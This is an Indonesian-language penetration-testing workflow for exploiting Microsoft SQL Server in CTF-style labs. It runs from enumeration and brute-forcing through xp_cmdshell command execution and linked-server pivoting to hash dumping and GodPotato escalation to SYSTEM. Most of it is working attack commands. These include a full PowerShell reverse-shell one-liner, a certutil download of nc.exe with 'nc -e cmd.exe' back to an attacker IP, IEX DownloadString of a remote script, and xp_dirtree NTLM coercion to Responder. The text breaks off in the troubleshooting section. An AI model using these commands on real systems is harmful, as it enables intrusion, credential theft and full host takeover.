---
id: "14b"
title: "Pentest Workflow: Microsoft SQL Server (MSSQL) Exploitation"
category: "2. Network Services"
categoryId: "network"
filename: "14b_mssql_workflow.md"
refs_out: ["05","06","07","12","14a","14c","35","37","42","45"]
refs_in: ["04","05","06","07","08","11","14a","14c","21","23","35","36","37","39","41","42","54","59","60","63"]
---

# Pentest Workflow: Microsoft SQL Server (MSSQL) Exploitation

text

```
==================================================================================
DOCUMENTATION TYPE : Service Exploitation Workflow (Database & Infrastructure)
SERVICE TARGET     : Microsoft SQL Server (MSSQL / SQL Server Express / Enterprise)
DEFAULT PORTS      : TCP 1433 (Default Instance), UDP 1434 (SQL Server Browser Service)
TARGET AUDIENCE    : Penetration Testers, CTF Players (HTB / THM / Proving Grounds)
PLATFORM CONTEXT   : Parrot OS XFCE / Debian CLI
PREREQUISITES      : File 01-04 (Recon), File 05 (SMB), File 06 (SSH), File 14a (MySQL)
==================================================================================
```

---

## 🧠 BAGIAN 1: MSSQL FUNDAMENTALS

### 1. Apa itu MSSQL? (Analogi Sederhana & Perbedaan dengan MySQL)

**Microsoft SQL Server (MSSQL)** adalah sistem manajemen basis data relasional (_Relational Database Management System - RDBMS_) enterprise buatan Microsoft.

> **Analogi Bank Data Korporat Windows:**  
> Jika **MySQL** diibaratkan gudang logistik modular open-source yang sering dipasang di gedung Linux, maka **MSSQL** adalah brankas perbankan korporat yang terintegrasi langsung dengan fondasi gedung Microsoft Windows. MSSQL dirancang untuk berkomunikasi secara native dengan Windows OS, Active Directory (Domain Accounts), dan subsistem Windows internal (seperti Service Control Manager dan Named Pipes).

text

```
+-------------------+-----------------------------------+-----------------------------------+
| Parameter         | Microsoft SQL Server (MSSQL)      | MySQL / MariaDB                   |
+-------------------+-----------------------------------+-----------------------------------+
| Vendor / Sifat    | Proprietary (Microsoft)           | Open Source (Oracle / Community)  |
| OS Utama          | Windows (Tersedia opsi di Linux)  | Multiplatform (Utamanya Linux)    |
| Port Default      | TCP 1433 (Database), UDP 1434 (SSB)| TCP 3306                          |
| Akun Superadmin   | 'sa' (System Administrator)       | 'root'                            |
| Integrasi OS      | Eksekusi OS via `xp_cmdshell`     | Terbatas via UDF plugin / INTO OUTFILE|
| Auth Terintegrasi | Windows Integrated Auth (NTLM/Kerb)| Native Database Auth              |
| Query Language    | Transact-SQL (T-SQL)              | Structured Query Language (SQL)   |
+-------------------+-----------------------------------+-----------------------------------+
```

---

### 2. Port TCP 1433 vs UDP 1434 (SQL Server Browser Service)

text

```
+----------+----------+-------------------------------------------------------------------------+
| Port     | Protokol | Fungsi & Peran dalam Penetration Testing                                |
+----------+----------+-------------------------------------------------------------------------+
| TCP 1433 | TCP      | Port listening standar untuk Default Instance (`MSSQLSERVER`).          |
|          |          | Titik masuk utama untuk koneksi database client (TDS Protocol).         |
+----------+----------+-------------------------------------------------------------------------+
| UDP 1434 | UDP      | SQL Server Browser Service. Menyediakan layanan resolusi nama instance. |
|          |          | Memberikan informasi nama instance terpasang, versi build, dan port TCP|
|          |          | dinamis jika server menggunakan Named Instances.                         |
+----------+----------+-------------------------------------------------------------------------+
```

---

### 3. SQL Server Instances: Default Instance vs. Named Instance

- **Default Instance (`MSSQLSERVER`):** Hanya boleh ada satu default instance per mesin. Instance ini mendengarkan koneksi langsung pada port statis **TCP 1433**. Anda cukup menghubungkan client ke IP target: `10.10.11.200`.
- **Named Instance (contoh: `SQLEXPRESS`, `DEV_DB`):** Beberapa instalasi MSSQL dapat berjalan di mesin yang sama. Instance bernama biasanya mendengarkan pada **port TCP dinamis acak** (misalnya TCP 49172). Client mengirim query broadcast UDP ke port 1434 untuk menanyakan pada port TCP berapa instance `SQLEXPRESS` sedang berjalan.
- **Format Penulisan Target:** `SERVERNAME\SQLEXPRESS` atau `10.10.11.200\SQLEXPRESS`.

---

### 4. Sistem Autentikasi MSSQL

1. **SQL Server Authentication (Mixed Mode):**
    - Database memvalidasi username dan password internal yang disimpan di master database.
    - Akun bawaan dengan hak istimewa tertinggi adalah **`sa`** (_System Administrator_).
2. **Windows Authentication (Integrated Security):**
    - Database mempercayai token keamanan dari Windows OS atau Active Directory Domain Controller.
    - Format username: `WORKGROUP\User`, `CORP\Administrator`, atau `domain.local\svc_mssql`.
    - Memungkinkan serangan **Pass-the-Hash (PTH)** langsung ke database tanpa perlu mengetahui password teks biasa.

---

### 5. Hirarki Privilege: `sysadmin` vs. Role Lainnya

text

```
+-----------------------+-----------------------------------------------------------------------+
| Database Role         | Hak Akses & Dampak Pentest                                            |
+-----------------------+-----------------------------------------------------------------------+
| sysadmin              | "Root / God Mode" pada MSSQL. Memiliki akses penuh ke seluruh database,|
| (Server-level)        | konfigurasi server, eksekusi `xp_cmdshell`, dan linked servers.       |
+-----------------------+-----------------------------------------------------------------------+
| serveradmin           | Mengubah konfigurasi server-level dan mematikan instance database.   |
+-----------------------+-----------------------------------------------------------------------+
| db_owner              | Penguasa penuh pada satu database spesifik (bukan seluruh server).    |
| (Database-level)      | Dapat membaca, menulis, dan menghapus seluruh tabel di DB tersebut.   |
+-----------------------+-----------------------------------------------------------------------+
| public                | Role default untuk seluruh login. Akses read sangat minim, tetapi     |
| (Server-level)        | sering kali diizinkan mengeksekusi `xp_dirtree` (NTLM Coercion!).     |
+-----------------------+-----------------------------------------------------------------------+
```

---

### 6. Apa itu `xp_cmdshell`? (The Holy Grail)

`xp_cmdshell` adalah prosedur tersimpan (_Extended Stored Procedure_) bawaan Microsoft yang mengizinkan pengguna berhak istimewa `sysadmin` mengeksekusi perintah command-line OS Windows (`cmd.exe`) langsung dari query SQL dan menerima outputnya dalam bentuk tabel teks.

- **Status Default:** Dinonaktifkan (_Disabled_) sejak Microsoft SQL Server 2005 untuk alasan keamanan.
- **Fakta Pentest:** Jika akun penyerang memiliki role `sysadmin`, penyerang dapat **mengaktifkan kembali `xp_cmdshell` secara dinamis** dalam 2 detik menggunakan Transact-SQL!

---

### 7. Apa itu Linked Servers? (Lateral Movement via Database)

**Linked Servers** adalah fitur yang memungkinkan instance MSSQL mengeksekusi perintah SQL atau stored procedure pada instance database jarak jauh (_Remote Database Server_) lain di jaringan internal.

> **Bahaya Keamanan:** Jika Database Server A (misal: Web DB) terhubung ke Database Server B (misal: Core Financial DB) dengan kredensial tersimpan sebagai `sa`, kita dapat melompat (_pivot_) dari Database A untuk mengeksekusi `xp_cmdshell` di Database B!

---

### 8. MSSQL Service Account & `SeImpersonatePrivilege`

Secara default di sistem operasi Windows modern, service MSSQL berjalan di bawah akun layanan lokal:

- `NT SERVICE\MSSQLSERVER`
- `NT SERVICE\MSSQL$SQLEXPRESS`
- Atau domain service account khusus: `CORP\svc_mssql`.

Akun layanan ini hampir selalu diberikan hak istimewa Windows bawaan bernama **`SeImpersonatePrivilege`**. Hak ini memungkinkan proses mengeksekusi token impersonation untuk naik tingkat (_Privilege Escalation_) menjadi **`NT AUTHORITY\SYSTEM`** secara instan menggunakan exploit berbasis Potato (_GodPotato_, _PrintSpoofer_, _JuicyPotatoNG_).

---

## 🛠️ BAGIAN 2: TOOL ARSENAL MSSQL

text

```
========================================================================================================
TOOL                 FUNGSI UTAMA                     KECEPATAN   PASS-THE-HASH   AUTO XP_CMDSHELL SHELL
========================================================================================================
impacket-mssqlclient Python MSSQL CLI Interaktif      Sangat Cepat Ya (NTLM)      Ya (Built-in Helper)
nxc (NetExec) mssql  Swiss-Army Knife, Spray & Exec   Sangat Cepat Ya (NTLM)      Ya (--local-auth/exec)
nmap (NSE scripts)   Version, Config & Vuln Scanner   Sedang      Tidak           Audit Only
msfconsole           Exploit Modules & Payload Runner Sedang      Ya              Ya (Meterpreter)
sqlcmd               Native Windows CLI SQL Utility   Cepat       Windows Native  Manual
DBeaver / HeidiSQL   GUI Database Browser & Manager   Sedang      Tidak           Manual GUI
========================================================================================================
```

---

### 1. `impacket-mssqlclient` — Alat Utama Pentest MSSQL di Linux

- **Fungsi:** Client CLI interaktif berbasis Python yang mendukung SQL Auth, Windows Auth, Kerberos, dan Pass-the-Hash.
- **Kapan digunakan:** Setiap kali Anda ingin berinteraksi secara manual dengan target MSSQL dari Parrot OS.

```bash
# 1. Koneksi menggunakan SQL Server Authentication (Akun 'sa')
impacket-mssqlclient sa:'Password123'@10.10.11.200 -db master

# 2. Koneksi menggunakan Windows Authentication (Domain User)
impacket-mssqlclient 'CORP/johndoe:Welcome2023!'@10.10.11.200 -windows-auth

# 3. Koneksi menggunakan Pass-the-Hash (NTLM Hash tanpa plaintext password)
impacket-mssqlclient Administrator@10.10.11.200 -hashes :aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971881 -windows-auth

# 4. Koneksi ke Named Instance pada port non-standar
impacket-mssqlclient 'sa:P@ssword1'@10.10.11.200 -port 49172

# ⚠️ KLARIFIKASI untuk pemula — Testing Blank Password (3 cara):

# Cara 1: Menggunakan flag -no-pass (paling simple)
impacket-mssqlclient sa@10.10.11.200 -no-pass

# Cara 2: Password kosong eksplisit dengan tanda petik kosong
impacket-mssqlclient sa:''@10.10.11.200

# Cara 3: Interactive prompt (akan diminta password, tekan Enter)
impacket-mssqlclient sa@10.10.11.200
# → Enter password: [tekan Enter langsung tanpa isi]

# ⚠️ PERHATIAN: Jika server tidak mengizinkan blank password, error:
# "Login failed. The login is from an untrusted domain."
# → Solusi: Coba -windows-auth atau test user lain
```

text

```
CONTOH OUTPUT impacket-mssqlclient:
[*] Encryption required, switching to TLS
[*] Target system is Windows Server 2019 Standard 17763
[+] SQL Server Version: Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
SQL (sa  guest@master)> 
```

---

### 2. `nxc` (NetExec) MSSQL Module

- **Fungsi:** Validasi kredensial, password spraying, pengecekan hak `sysadmin`, dan eksekusi command one-liner.
- **Kapan digunakan:** Reconnaissance cepat dan spraying daftar kredensial.

```bash
# 1. Validasi kredensial & cek apakah akun memiliki role sysadmin
nxc mssql 10.10.11.200 -u 'sa' -p 'Password123'

# 2. Validasi kredensial Windows Authentication lokal
nxc mssql 10.10.11.200 -u 'Administrator' -p 'P@ssword1!' --local-auth

# 3. Eksekusi perintah command prompt secara langsung via NetExec
nxc mssql 10.10.11.200 -u 'sa' -p 'Password123' -x 'whoami /priv'

# 4. Password Spraying terhadap daftar user
nxc mssql 10.10.11.200 -u users.txt -p 'Spring2023!' --continue-on-success
```

text

```
CONTOH OUTPUT nxc mssql:
MSSQL       10.10.11.200    1433   SQL01            [*] Windows 10.0 Build 17763 (name:SQL01) (domain:CORP)
MSSQL       10.10.11.200    1433   SQL01            [+] CORP\sa:Password123 (sysadmin:True)
```

---

### 3. `nmap` NSE Scripts untuk MSSQL

- **Fungsi:** Mengumpulkan metadata instance, konfigurasi server, akun default ber-password kosong, dan dump password hash.

```bash
# 1. Cek info versi, nama instance, dan port dinamis
nmap -p 1433 --script ms-sql-info 10.10.11.200

# 2. Scan akun sa dengan password kosong (Blank Password Check)
nmap -p 1433 --script ms-sql-empty-password 10.10.11.200

# 3. Dump password hashes dari sys.sql_logins (memerlukan hak sa/sysadmin)
nmap -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=sa,mssql.password=Password123 10.10.11.200
```

---

### 4. Metasploit MSSQL Modules

- **Fungsi:** Otomasi penyerangan dan delivery payload binary reverse shell via SQL query.

```bash
# 1. Ping discovery via SQL Browser Service (UDP 1434)
msfconsole -q -x "use auxiliary/scanner/mssql/mssql_ping; set RHOSTS 10.10.11.200; run; exit"

# 2. Login Bruteforce / Credential Checker
msfconsole -q -x "use auxiliary/scanner/mssql/mssql_login; set RHOSTS 10.10.11.200; set USER_FILE users.txt; set PASS_FILE passwords.txt; run; exit"

# 3. Eksekusi Command Payload Reverse Shell
msfconsole -q -x "use exploit/windows/mssql/mssql_payload; set RHOSTS 10.10.11.200; set USERNAME sa; set PASSWORD Password123; set LHOST tun0; exploit"
```

---

### 5. `sqlcmd` (Windows Native Utility)

- **Fungsi:** Utilitas resmi bawaan Microsoft Windows untuk mengelola database dari dalam command line target.
- **Kapan digunakan:** Saat Anda sudah memiliki Windows shell (misal via WinRM atau SSH) dan ingin mengakses MSSQL lokal di `localhost`.

cmd

```
:: 1. Koneksi ke localhost menggunakan Windows Authentication (Trusted Connection)
sqlcmd -S 127.0.0.1 -E

:: 2. Koneksi ke instance lokal menggunakan SQL Authentication
sqlcmd -S 127.0.0.1 -U sa -P Password123 -Q "SELECT @@version;"
```

---

## 🎯 BAGIAN 3: WORKFLOW UTAMA (STEP BY STEP)

text

```
==================================================================================
TARGET CONFIGURATION SETUP (Jalankan di terminal Parrot OS):
==================================================================================
```

```bash
export TARGET="10.10.11.200"
export ATTACKER_IP="10.10.14.5"
echo "Target MSSQL Host: $TARGET"
```

---

### FASE 1: DETEKSI MSSQL & INSTANCE ENUMERATION

Tujuan: Mengidentifikasi status port TCP 1433, nama instance, versi exact database engine, dan service UDP 1434.

```bash
# 1. Port scan TCP 1433 & UDP 1434
nmap -sS -sU -p T:1433,U:1434 -sV $TARGET -oN nmap_mssql_recon.txt

# 2. NSE Discovery script untuk mengekstrak nama instance & port TDS dinamis
nmap -p 1433 --script ms-sql-info,ms-sql-ntlm-info $TARGET
```

text

```
CONTOH OUTPUT NMAP:
PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; SP0
| ms-sql-info: 
|   10.10.11.200:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service Pack Level: RTM
|       Post-SP patches applied: false
|_    Instance name: MSSQLSERVER
| ms-sql-ntlm-info: 
|   Target_Name: CORP
|   NetBIOS_Domain_Name: CORP
|   NetBIOS_Computer_Name: SQL01
|   DNS_Domain_Name: corp.local
|_  DNS_Computer_Name: sql01.corp.local
```

---

### FASE 2: AUTENTIKASI & TESTING CREDENTIALS

Tujuan: Menguji akun default `sa`, kredensial umum, Windows Authentication, atau Pass-the-Hash.

```bash
# 1. Uji login sa dengan blank password (password kosong)
impacket-mssqlclient sa@$TARGET -no-pass

# 2. Uji login sa dengan password umum (sa, admin, Password1, Password123)
impacket-mssqlclient sa:sa@$TARGET
impacket-mssqlclient sa:Password123@$TARGET

# 3. Uji login menggunakan kredensial yang di-loot dari file web.config atau SMB
impacket-mssqlclient 'CORP/web_user:DbPass2023!'@$TARGET -windows-auth

# 4. Dictionary Attack via Hydra (Maksimal 4 threads agar koneksi TDS tidak hang)
hydra -l sa -P /usr/share/wordlists/rockyou.txt $TARGET mssql -t 4 -f -V
```

---

### FASE 3: MSSQL RECONNAISSANCE (SETELAH LOGIN)

Setelah masuk ke dalam interactive prompt `SQL>`, jalankan query pengintaian Transact-SQL berikut secara berurutan:

SQL

```
-- 1. Cek versi detail SQL Server dan Sistem Operasi host
SELECT @@version;

-- 2. Cek akun login saat ini (SQL Principal vs Server User)
SELECT SYSTEM_USER;
SELECT USER_NAME();

-- 3. Cek apakah akun kita memiliki hak istimewa 'sysadmin' (1 = YA, 0 = BUKAN)
SELECT IS_SRVROLEMEMBER('sysadmin');

-- 4. Tampilkan daftar semua database yang ada di server
SELECT name FROM master.dbo.sysdatabases;

-- 5. Pindah konteks ke database spesifik dan list seluruh tabel
USE master;
SELECT table_name FROM INFORMATION_SCHEMA.TABLES;

-- 6. Menampilkan semua login yang terdaftar pada sistem MSSQL
SELECT name, is_srvrolemember('sysadmin') as is_sysadmin FROM sys.server_principals WHERE type IN ('S', 'U');

-- 7. Cek apakah ada Linked Servers (Koneksi ke database server lain)
EXEC sp_linkedservers;
SELECT * FROM sys.servers;

-- 8. Cek status konfigurasi xp_cmdshell saat ini
EXEC sp_configure 'show advanced options';
EXEC sp_configure 'xp_cmdshell';
```

text

```
CONTOH OUTPUT RECON PADA impacket-mssqlclient:
SQL (sa  guest@master)> SELECT IS_SRVROLEMEMBER('sysadmin');
-----------   
          1   

SQL (sa  guest@master)> SELECT name FROM master.dbo.sysdatabases;
name          
-----------   
master        
tempdb        
model         
msdb          
portal_db     
```

---

### FASE 4: `xp_cmdshell` — OS COMMAND EXECUTION

Jika query `IS_SRVROLEMEMBER('sysadmin')` mengembalikan nilai `1`, Anda memiliki wewenang untuk membuka shell Windows.

text

```
+-----------------------------------------------------------------------------------+
|               PROSES REKONFIGURASI DAN EKSEKUSI xp_cmdshell                       |
+-----------------------------------------------------------------------------------+
| 1. Buka opsi konfigurasi lanjutan   -> sp_configure 'show advanced options', 1    |
| 2. Terapkan konfigurasi             -> RECONFIGURE                                |
| 3. Aktifkan komponen xp_cmdshell    -> sp_configure 'xp_cmdshell', 1              |
| 4. Terapkan konfigurasi             -> RECONFIGURE                                |
| 5. Eksekusi Command OS              -> EXEC xp_cmdshell 'perintah_windows'        |
+-----------------------------------------------------------------------------------+
```

#### 4.1. Manual Enable via SQL Queries

SQL

```
-- Mengaktifkan opsi lanjutan
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;

-- Mengaktifkan xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

#### 4.2. Eksekusi Perintah Sistem Operasi

SQL

```
-- Cek identitas user OS Windows yang menjalankan proses MSSQL
EXEC xp_cmdshell 'whoami';

-- Cek hak istimewa token Windows (Cari SeImpersonatePrivilege!)
EXEC xp_cmdshell 'whoami /priv';

-- Enumerasi user lokal dan network configuration
EXEC xp_cmdshell 'net user';
EXEC xp_cmdshell 'ipconfig /all';
```

text

```
CONTOH OUTPUT EKSEKUSI:
output                                                 
----------------------------------------------------   
nt service\mssqlserver                                 
NULL                                                   

SQL (sa  guest@master)> EXEC xp_cmdshell 'whoami /priv';
output                                                 
----------------------------------------------------   
PRIVILEGES INFORMATION                                 
----------------------                                 
Privilege Name                Description                    State     
============================= ============================== ========= 
SeAssignPrimaryTokenPrivilege Replace a process level token  Disabled  
SeIncreaseQuotaPrivilege      Adjust memory quotas for a pr  Disabled  
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled   
SeImpersonatePrivilege        Impersonate a client after aut Enabled   
SeCreateGlobalPrivilege       Create global objects          Enabled   
```

#### 4.3. Mengirim Interactive Reverse Shell

##### Opsi A: PowerShell Base64 Encoded One-Liner (Sangat Stabil)

Siapkan command PowerShell di terminal Parrot OS untuk menguji IP attacker:

Bash

```
# Buat string PowerShell reverse shell
pwsh -Command '$code = [System.Text.Encoding]::Unicode.GetBytes("$client = New-Object System.Net.Sockets.TCPClient(\"10.10.14.5\",9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"); [Convert]::ToBase64String($code)'
```

Lalu di dalam `impacket-mssqlclient`:

SQL

```
EXEC xp_cmdshell 'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAA...';
```

##### Opsi B: Mengunduh `nc.exe` via Certutil dan Eksekusi

SQL

```
-- Host nc.exe di Parrot OS: python3 -m http.server 80
EXEC xp_cmdshell 'certutil.exe -urlcache -split -f "http://10.10.14.5/nc.exe" C:\Windows\Temp\nc.exe';
EXEC xp_cmdshell 'C:\Windows\Temp\nc.exe -e cmd.exe 10.10.14.5 9001';
```

#### 4.4. Helper Otomatis di `impacket-mssqlclient`

`impacket-mssqlclient` memiliki command built-in yang otomatis menjalankan rekonfigurasi tanpa mengetik query manual:

text

```
SQL (sa  guest@master)> enable_xp_cmdshell
[*] INFO: show advanced options enabled
[*] INFO: xp_cmdshell enabled

SQL (sa  guest@master)> xp_cmdshell whoami
nt service\mssqlserver
```

---

### FASE 5: STEAL NETNTLM HASH VIA MSSQL (`xp_dirtree` COERCION)

Jika akun Anda **BUKAN `sysadmin`** (misal hanya role `public`), Anda tetap dapat membobol sistem dengan memaksa MSSQL melakukan autentikasi NTLM keluar (_Coercion_) ke mesin penyerang!

text

```
[ Parrot OS Attacker ] <===== SMB Authentication Request ===== [ Target MSSQL ]
  (10.10.14.5:445)                                              (EXEC xp_dirtree '\\10.10.14.5\share')
         |
  [ Responder ]
         |
         v
[ NetNTLMv2 Hash Captured! ] ---> [ Hashcat Mode 5600 ] ---> [ Plaintext Password ]
```

```bash
# Langkah 1: Jalankan Responder di Parrot OS (Terminal 1)
sudo responder -I tun0 -v

# Langkah 2: Di dalam MSSQL shell (Terminal 2), panggil xp_dirtree atau xp_fileexist ke IP penyerang
```

SQL

```
-- Memaksa server MSSQL mengakses network share palsu kita
EXEC master..xp_dirtree '\\10.10.14.5\pwn';
-- Alternatif:
EXEC master..xp_fileexist '\\10.10.14.5\pwn';
```

text

```
CONTOH OUTPUT CAPTURE PADA RESPONDER:
[SMB] NTLMv2-SSP Client   : 10.10.11.200
[SMB] NTLMv2-SSP Username : SQL01\svc_mssql
[SMB] NTLMv2-SSP Hash     : svc_mssql::CORP:5c2a4f6...:44a70...:0101000000000000...
```

```bash
# Langkah 3: Simpan hash tersebut ke file dan crack menggunakan Hashcat
hashcat -m 5600 mssql_netntlm.txt /usr/share/wordlists/rockyou.txt -O
```

---

### FASE 6: LINKED SERVER ATTACK (LATERAL MOVEMENT)

Tujuan: Melakukan pivot dari database yang sedang kita masuki menuju database server lain di jaringan internal.

SQL

```
-- 1. Identifikasi server yang terhubung (Linked Servers)
SELECT srvname, srvproduct, providername, datasrc FROM master.dbo.sysservers;

-- 2. Cek apakah link server mengizinkan eksekusi query (OpenQuery)
SELECT * FROM OPENQUERY("REMOTE-DB-02", 'SELECT @@version');

-- 3. Cek apakah login kita di Remote Server adalah sysadmin!
SELECT * FROM OPENQUERY("REMOTE-DB-02", 'SELECT IS_SRVROLEMEMBER(''sysadmin'')');

-- 4. Mengaktifkan xp_cmdshell di Remote Linked Server
EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT "REMOTE-DB-02";
EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT "REMOTE-DB-02";

-- 5. Eksekusi perintah sistem operasi di Remote Linked Server!
EXEC ('EXEC xp_cmdshell ''powershell.exe -enc JABjAGw...''') AT "REMOTE-DB-02";
```

---

### FASE 7: MSSQL CREDENTIAL EXTRACTION

Jika memiliki hak akses `sysadmin`, ekstrak hash seluruh akun SQL lokal langsung dari tabel master `sys.sql_logins`.

SQL

```
-- Ekstraksi nama akun dan format password hash
SELECT name, password_hash FROM master.sys.sql_logins;
```

text

```
CONTOH OUTPUT DATABASE HASHES:
name       password_hash                                        
-------    --------------------------------------------------   
sa         0x02005A328...E81B89C819F3795C62... (MSSQL 2012+)  
db_admin   0x01004B219...A81C77D912E3795A11... (MSSQL 2005/2008)
```

```bash
# Mode Cracking Hashcat untuk MSSQL:
# MSSQL 2000          : -m 131   (0x0100...)
# MSSQL 2005 / 2008   : -m 132   (0x0100...)
# MSSQL 2012 / 2014+  : -m 1731  (0x0200...)

hashcat -m 1731 mssql_hashes.txt /usr/share/wordlists/rockyou.txt -O
```

---

## ⚡ BAGIAN 4: PRIVILEGE ESCALATION VIA MSSQL

### 1. Eksploitasi `SeImpersonatePrivilege` (Potato Attack)

Hampir seluruh service account MSSQL (`nt service\mssqlserver`) memiliki `SeImpersonatePrivilege`. Setelah Anda mendapatkan reverse shell dari `xp_cmdshell`, eskalasi hak akses ke **`NT AUTHORITY\SYSTEM`** adalah langkah yang deterministik:

cmd

```
:: 1. Verifikasi Privilege pada Shell Target
whoami /priv
:: Perhatikan baris: SeImpersonatePrivilege -> Enabled
```

```bash
# 2. Transfer binary GodPotato-NET4.exe dari Parrot OS
# Parrot OS: python3 -m http.server 80
# Windows Shell:
certutil -urlcache -split -f "http://10.10.14.5/GodPotato-NET4.exe" C:\Windows\Temp\gp.exe
```

cmd

```
:: 3. Eksekusi GodPotato untuk spawn shell baru sebagai SYSTEM
C:\Windows\Temp\gp.exe -cmd "C:\Windows\Temp\nc.exe -e cmd.exe 10.10.14.5 9002"
```

text

```
CONTOH OUTPUT LISTENER 9002 DI PARROT OS:
listening on [any] 9002 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.11.200] 49832
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

---

## 🔗 BAGIAN 5: ATTACK CHAINING

text

```
+----------------------------------------------------------------------------------------------------+
|                                    MSSQL ATTACK CHAIN SCENARIOS                                    |
+----------------------------------------------------------------------------------------------------+
| Chain 1: Port 1433 -> sa:blank -> xp_cmdshell -> Reverse Shell -> GodPotato -> NT AUTHORITY\SYSTEM |
| Chain 2: web.config Loot -> MSSQL Auth -> Database Dump -> Hash Crack -> WinRM Admin Access        |
| Chain 3: MSSQL Low Priv -> xp_dirtree -> Responder Capture -> Hashcat 5600 -> Domain User Shell  |
| Chain 4: Web Shell -> MSSQL Linked Server Pivot -> RCE on Remote Database Core Server               |
+----------------------------------------------------------------------------------------------------+
```

---

### ⛓️ CHAIN 1: Blank `sa` →→ `xp_cmdshell` →→ `GodPotato` →→ SYSTEM

text

```
[ Port 1433 Open ] 
        |
   (sa:blank)
        |
        v
[ impacket-mssqlclient ] 
        |
 (enable_xp_cmdshell)
        |
        v
[ Reverse Shell: nt service\mssqlserver ] 
        |
 (whoami /priv -> SeImpersonatePrivilege)
        |
        v
[ GodPotato-NET4.exe ] 
        |
        v
[ NT AUTHORITY\SYSTEM Root Shell! ]
```

```bash
# 1. Connect ke target
impacket-mssqlclient sa@$TARGET -no-pass

# 2. Enable xp_cmdshell & kirim reverse shell
# Di prompt MSSQL:
enable_xp_cmdshell
xp_cmdshell powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')"

# 3. Di reverse shell, jalankan potato exploit
# C:\Windows\Temp\gp.exe -cmd "whoami"
# Output: nt authority\system
```

---

### ⛓️ CHAIN 2: `web.config` Discovery →→ MSSQL Dump →→ Admin WinRM

text

```
[ Web Server (Port 80 LFI / FTP Loot) ] 
                   |
     (Read C:\inetpub\wwwroot\web.config)
                   |
                   v
[ ConnectionString: User ID=db_admin; Password=SecretSQLPass2023! ] 
                   |
      (Connect impacket-mssqlclient)
                   |
                   v
[ Dump Table: users (Admin NTLM / SHA256 Hash) ] 
                   |
      (Crack Hash / Pass-the-Hash)
                   |
                   v
[ evil-winrm Login: Administrator@10.10.11.200 ]
```

---

## 📄 BAGIAN 6: `web.config` CREDENTIAL DISCOVERY

Di hampir semua target Windows IIS + ASP.NET di CTF, kredensial MSSQL tersimpan di dalam file konfigurasi **`web.config`**.

### Lokasi Umum `web.config`:

- `C:\inetpub\wwwroot\web.config`
- `C:\inetpub\wwwroot\app\web.config`
- `C:\Program Files\ApplicationName\web.config`
- `D:\Websites\SiteName\web.config`

### Format Kredensial di `web.config`:

XML

```
<configuration>
  <connectionStrings>
    <add name="SqlConn" 
         connectionString="Server=127.0.0.1;Database=CorporatePortal;User Id=portal_user;Password=SuperP@ssw0rd2023!;" 
         providerName="System.Data.SqlClient" />
  </connectionStrings>
</configuration>
```

Bash

```
# Perintah cepat mengekstrak baris connectionString dari shell target:
type C:\inetpub\wwwroot\web.config | findstr /i "connectionString User Password Data Source"
```

---

## 🌳 BAGIAN 7: DECISION TREE LENGKAP

text

```
                           [PORT 1433 OPEN]
                                  |
              +-------------------+-------------------+
              |                                       |
    [TEST SA BLANK / COMMON]               [CREDENTIALS FROM RECON]
    impacket-mssqlclient sa@$TARGET        (web.config / SMB / Source Code)
              |                                       |
     +--------+--------+                     +--------+--------+
     |                 |                     |                 |
  [FAILED]         [SUCCESS]              [FAILED]         [SUCCESS]
     |                 |                     |                 |
Hydra Bruteforce       +---------------------+-----------------+
(Max 4 threads)                              |
                                      [AUTHENTICATED]
                                             |
                         +-------------------+-------------------+
                         |                                       |
                 [IS SYSADMIN = 1]                       [IS SYSADMIN = 0]
                         |                                       |
           +-------------+-------------+                         |
           |                           |                         |
    [ENABLE XP_CMDSHELL]        [CHECK LINKED SERVERS]           |
    sp_configure 'xp_cmdshell'  sp_linkedservers                 |
           |                           |                         |
     Execute Command /          Remote Sysadmin?                 |
     Download nc.exe /          EXEC ('...') AT [SRV]            |
     PowerShell RevShell               |                         |
           |                           v                         |
     [SHELL ACCESS]              [REMOTE RCE]                    |
     nt service\mssqlserver                                      |
           |                                                     |
  [whoami /priv Check]                                           |
  SeImpersonatePrivilege?                                        |
     +-----+-----+                                               |
     |           |                                               |
   [YES]        [NO]                                             |
     |           |                                               |
GodPotato    Enumerate Local DBs                                 |
     |           |                                               |
[NT AUTHORITY\   +-----------------------+-----------------------+
    SYSTEM]                              |
                                         v
                         +---------------+---------------+
                         |                               |
                 [DUMP DB DATA]                 [NTLM COERCION]
                 SELECT * FROM users;           xp_dirtree '\\ATTACKER\share'
                 Extract Passwords / Hashes              |
                         |                      [RESPONDER CAPTURE]
                 Password Reuse / Crack                  |
                         |                      Hashcat Mode 5600 Crack
                         v                               |
                 [PIVOT TO WINRM / SSH / SMB] <----------+
```

---

## 🔧 BAGIAN 8: COMMON ERRORS & TROUBLESHOOTING

### 1. `Login failed for user 'sa'. Reason: The account is disabled.` (Error 18456)

- **Penyebab:** Server MSSQL dikonfigurasi dalam mode **Windows Authentication Only**, bukan Mixed Mode. Akun `sa` dinonaktifkan secara default.
- **Solusi CLI:** Beralih ke Windows Authentication menggunakan akun Windows valid atau NTLM Hash:
    
